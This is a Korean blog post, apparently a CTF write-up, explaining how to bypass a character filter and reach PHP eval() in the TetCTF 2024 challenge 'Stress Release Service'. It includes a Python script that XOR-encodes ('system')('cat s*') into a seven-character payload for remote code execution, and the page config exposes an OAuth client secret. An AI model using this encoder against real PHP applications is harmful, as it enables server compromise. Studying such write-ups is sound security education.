@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juhyun167.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="개요  For a better New Year, we are introducing a service that can help you reduce stress.  chall.zip 문제 분석 웹페이지에 들어가면 입력 창과 버튼이 하나 있습니다. 버튼을 클릭하면 입력한 내용과 개구리가 함께 출력됩니다.  소스 코드가 제공된 문제로, 플래그는 secret.php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[TetCTF 2024] Stress Release Service">
+<meta property="og:url" content="https://juhyun167.github.io/2024/02/03/tet24-stress-release-service/index.html">
+<meta property="og:site_name" content="JUHYUN167">
+<meta property="og:description" content="개요  For a better New Year, we are introducing a service that can help you reduce stress.  chall.zip 문제 분석 웹페이지에 들어가면 입력 창과 버튼이 하나 있습니다. 버튼을 클릭하면 입력한 내용과 개구리가 함께 출력됩니다.  소스 코드가 제공된 문제로, 플래그는 secret.php">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://juhyun167.github.io/images/tet24-stress-release-service/1.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/tet24-stress-release-service/2.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/tet24-stress-release-service/3.png">
+<meta property="article:published_time" content="2024-02-03T16:32:53.000Z">
+<meta property="article:modified_time" content="2024-02-04T06:43:41.641Z">
+<meta property="article:author" content="juhyun167 블로그">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://juhyun167.github.io/images/tet24-stress-release-service/1.png">
+
+
+<link rel="canonical" href="https://juhyun167.github.io/2024/02/03/tet24-stress-release-service/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://juhyun167.github.io/2024/02/03/tet24-stress-release-service/","path":"2024/02/03/tet24-stress-release-service/","title":"[TetCTF 2024] Stress Release Service"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[TetCTF 2024] Stress Release Service | JUHYUN167</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2NL1HJ159T"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-2NL1HJ159T","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+
+
+
+<!-- custom fonts -->
+<link rel="stylesheet" as="style" crossorigin href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard/dist/web/static/pretendard-dynamic-subset.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+<!-- google search console -->
+<meta name="google-site-verification" content="pV2zNbKpqSdeajzc7IIefYq62vg-J9PCZfCvLKwnYF8" />
+<!-- naver search advisor -->
+<meta name="naver-site-verification" content="e4b3b4646981d90b2cfdab4014543ed9338b4e57" />
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/rss2.xml" title="JUHYUN167" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/custom-logo.png" alt="JUHYUN167">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">JUHYUN167</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">juhyun167 blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+<!-- load header custom script -->
+<script src="/scripts/header.js"></script>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">juhyun167 블로그</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+
+<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Computer-Science/">Computer Science</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Computer-Science/Data-Structures/">Data Structures</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Security/">Security</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Security/CTF/">CTF</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Security/Reverse-Engineering/">Reverse Engineering</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Thoughts/">Thoughts</a><span class="category-list-count">3</span></li></ul>
+
+<!-- load sidebar custom script -->
+<script src="/scripts/sidebar.js"></script>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://juhyun167.github.io/2024/02/03/tet24-stress-release-service/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="juhyun167 블로그">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JUHYUN167">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[TetCTF 2024] Stress Release Service | JUHYUN167">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [TetCTF 2024] Stress Release Service
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-02-03 16:32:53" itemprop="dateCreated datePublished" datetime="2024-02-03T16:32:53+00:00">2024-02-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-02-04 06:43:41" itemprop="dateModified" datetime="2024-02-04T06:43:41+00:00">2024-02-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Security/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
+<blockquote>
+<p>For a better New Year, we are introducing a service that can help you reduce stress.</p>
+</blockquote>
+<p><a href="/uploads/tet24-stress-release-service/chall.zip">chall.zip</a></p>
+<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
+<p>웹페이지에 들어가면 입력 창과 버튼이 하나 있습니다. 버튼을 클릭하면 입력한 내용과 개구리가 함께 출력됩니다.</p>
+<p><img src="/images/tet24-stress-release-service/1.png" alt="1.png"></p>
+<p>소스 코드가 제공된 문제로, 플래그는 <code>secret.php</code> 에 하드코딩되어 있습니다. 상단에 배포한 파일에는 실제 플래그를 적어놓기는 했지만, 대회 환경에서 배포된 파일에는 가짜 플래그가 적혀 있습니다.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Veryyyyyy Secretttttttttttt !!!!!!!!!!!!!!!!!</span></span><br><span class="line"><span class="variable">$FL4ggggggggggg</span> = <span class="string">&quot;TetCTF&#123;*** redacted ***&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>index.php</code> 를 보면 입력한 내용이 <code>$voice</code> 에 대입됩니다. 이후 <code>validateInput()</code> 함수의 검증을 통과할 경우 <code>eval()</code> 함수의 문자열 인자 중 일부로 전달됩니다. PHP의 <code>eval()</code> 함수는 문자열을 코드로 간주하여 실행하는 함수이기 때문에, 임의 코드 실행이 가능한 상황입니다.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;shout&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;shout&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&quot;shout&quot;</span>])) &#123;</span><br><span class="line">	<span class="variable">$voice</span> = <span class="variable">$_GET</span>[<span class="string">&quot;shout&quot;</span>];</span><br><span class="line">	<span class="variable">$res</span> = <span class="string">&quot;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;img src=\&quot;https://i.imgur.com/SvbbT0W.png\&quot; width=5% /&gt; WRONGGGGG WAYYYYYY TOOOO RELEASEEEEE STRESSSSSSSS!!!!!!&lt;/center&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">validateInput</span>(<span class="variable">$voice</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="string">&quot;\$res=&#x27;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;img src=\&quot;https://i.imgur.com/TL6siVW.png\&quot; width=5% /&gt; &quot;</span>.<span class="variable">$voice</span>.<span class="string">&quot;.&lt;/center&gt;&#x27;;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$res</span>) &lt; <span class="number">300</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;Too loud!!! Please respect your neighbor.&lt;/center&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>validateInput()</code> 함수는 입력이 특수문자로만 이루어져 있는지, 사용한 문자의 종류가 7종을 초과하는지 검사합니다. 즉 이 문제는 특수문자 7종 이하만을 사용한 PHP 코드 작성을 요구하고 있습니다.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateInput</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// To make your shout effective, it shouldn&#x27;t contain alphabets or numbers.</span></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// and only a few characters. Let&#x27;s make your shout clean.</span></span><br><span class="line">	<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">array_count_values</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$input</span>)));</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="number">7</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
+<p>기존의 특수문자만을 이용한 PHP 코드 실행 문제를 보면 몇 가지 파훼법이 존재합니다. 예를 들어 아래 풀이는 <code>$_</code> 변수에 아무 문자열이나 대입한 후, <code>$_++;</code> 로 원하는 문자가 나올 때까지 증감 연산을 하는 방법을 사용합니다.</p>
+<p><div class="link-preview-widget"><a href="https://medium.com/mucomplex/bypass-with-php-non-alpha-encoder-fee4e1bac31e" rel="noopener external nofollow noreferrer" target="_blank"><div class="link-preview-widget-title">Bypass with PHP non-alpha encoder</div><div class="link-preview-widget-description">In this tutorial, I will cover PHP non-alpha encoder. I will show some basic concept first before we going deeper which may cause brain…</div><div class="link-preview-widget-url">Medium</div></a><a class="link-preview-widget-image" href="https://medium.com/mucomplex/bypass-with-php-non-alpha-encoder-fee4e1bac31e" rel="noopener external nofollow noreferrer" style="background-image: url('https://miro.medium.com/v2/da:true/resize:fit:800/1*iZe04u0aJPryRXy3azmq6w.gif');" target="_blank"></a></div></p>
+<p>그런데 이 문제는 PHP 8.3 버전에서 동작하여 위와 같은 방식을 사용할 수 없습니다. 증감 연산자에 대한 PHP <a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.php.net/manual/en/language.operators.increment.php">문서</a>를 보면 8.3 버전부터 문자열에 대한 증감 연산을 더 이상 지원하지 않습니다.</p>
+<p><img src="/images/tet24-stress-release-service/2.png" alt="2.png"></p>
+<p>다만 PHP의 논리적 xor 연산자는 문자열 간의 연산을 지원하고 있습니다. <code>php -a</code> 로 인터랙티브 셸을 실행하여 확인할 수도 있습니다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; echo &#x27;(&#x27; ^ &#x27;\\&#x27;;</span><br><span class="line">t</span><br></pre></td></tr></table></figure>
+<p>그렇다면 특수문자 7종 간 xor 연산을 계속하여 코드 실행에 필요한 문자를 모두 얻을 수도 있을 것입니다.</p>
+<p><code>index.php</code> 코드를 보면 입력은 <code>$res = '...</code> 와 <code>...';</code> 사이에 들어갑니다. 따라서 문자열과 코드를 분리하기 위한 <code>'</code> 와 <code>;</code> 이 필요합니다. 또한 xor과 문자열 덧셈을 위한 <code>^</code> 와 <code>.</code> , xor 연산식을 감싸기 위한 <code>(</code> 와 <code>)</code> 를 선택했습니다. 7종을 채우려면 하나가 남는데, 역슬래시 <code>\\</code> 를 사용했습니다.</p>
+<p>각 알파벳을 가장 적은 횟수의 xor 연산으로 얻는 완전 탐색을 실시하면, 선택한 특수문자 중 최대 6종만으로 모든 문자의 조합이 가능함을 확인할 수 있습니다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;A&#x27;: [39, 59, 40, 41, 92],</span><br><span class="line"> &#x27;B&#x27;: [39, 94, 59],</span><br><span class="line"> &#x27;C&#x27;: [39, 94, 59, 40, 41],</span><br><span class="line">...</span><br><span class="line"> &#x27;x&#x27;: [39, 94, 40, 41],</span><br><span class="line"> &#x27;y&#x27;: [39, 94],</span><br><span class="line"> &#x27;z&#x27;: [39, 40, 41, 92]&#125;</span><br></pre></td></tr></table></figure>
+<p>추가적으로 PHP는 다음과 같이 함수명에 해당하는 문자열을 괄호로 감싸 함수 호출이 가능합니다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; system(&quot;id&quot;);</span><br><span class="line">uid=501(user) gid=1000(user) groups=1000(user)</span><br><span class="line">php &gt;</span><br><span class="line">php &gt; (&quot;system&quot;)(&quot;id&quot;);</span><br><span class="line">uid=501(user) gid=1000(user) groups=1000(user)</span><br></pre></td></tr></table></figure>
+<p>따라서 <code>system()</code> 함수를 호출해 임의 커맨드를 실행할 수 있습니다. 아래 코드는 완전 탐색 후 <code>(&quot;system&quot;)(&quot;cat s*&quot;)</code> 를 실행하기 위한 특수문자 문자열을 조합합니다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">tbl = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_table</span>():</span><br><span class="line">    <span class="keyword">global</span> tbl</span><br><span class="line"></span><br><span class="line">    cs = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, [<span class="string">b&quot;&#x27;&quot;</span>, <span class="string">b&quot;^&quot;</span>, <span class="string">b&quot;;&quot;</span>, <span class="string">b&quot;(&quot;</span>, <span class="string">b&quot;)&quot;</span>, <span class="string">b&quot;.&quot;</span>, <span class="string">b&quot;\\&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> it <span class="keyword">in</span> combinations(cs, i):</span><br><span class="line">            c = <span class="built_in">chr</span>(reduce(xor, it))</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> string.ascii_letters + <span class="string">&quot; *&quot;</span>:</span><br><span class="line">                tbl[c] = <span class="built_in">list</span>(it)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tbl</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rtos</span>(<span class="params">r: <span class="built_in">list</span></span>):</span><br><span class="line">    res = <span class="string">&quot;(&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>, r)):</span><br><span class="line">        res += <span class="string">&quot;&#x27;&quot;</span> + (<span class="string">&quot;\\&quot;</span> <span class="keyword">if</span> c <span class="keyword">in</span> [<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&quot;</span>] <span class="keyword">else</span> <span class="string">&quot;&quot;</span>) + c + <span class="string">&quot;&#x27;^&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res[:-<span class="number">1</span>] + <span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">s</span>):</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">        res += rtos(tbl[s[i]]) + <span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    gen_table()</span><br><span class="line"></span><br><span class="line">    f = encode(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">    a = encode(<span class="string">&quot;cat s*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&#x27;;(<span class="subst">&#123;f&#125;</span>)(<span class="subst">&#123;a&#125;</span>);&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>문자열을 입력하고 버튼을 누르면 개구리 말고 다른 내용은 보이지 않는데, 브라우저의 소스 코드 확인 기능을 이용하면 플래그가 포함되어 있는 것을 확인할 수 있습니다.</p>
+<p><img src="/images/tet24-stress-release-service/3.png" alt="3.png"></p>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/12/31/looking-back-on-2022/" rel="prev" title="2022년을 돌아보며">
+                  <i class="fa fa-chevron-left"></i> 2022년을 돌아보며
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class=""></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Juhyun Song</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.1/es5/tex-mml-chtml.js","integrity":"sha256-hlC2uSQYTmPsrzGZTEQEg9PZ1a/+SV6VBCTclohf2og="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"juhyun167","repo":"juhyun167.github.io","client_id":"97ef06bf938b3dfb0c5b","client_secret":"210c90c45a592282824bbc4312dbc74b3709bbea","admin_user":"juhyun167","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"en","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"f7249102c7f242775c3efc1712bb7461"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
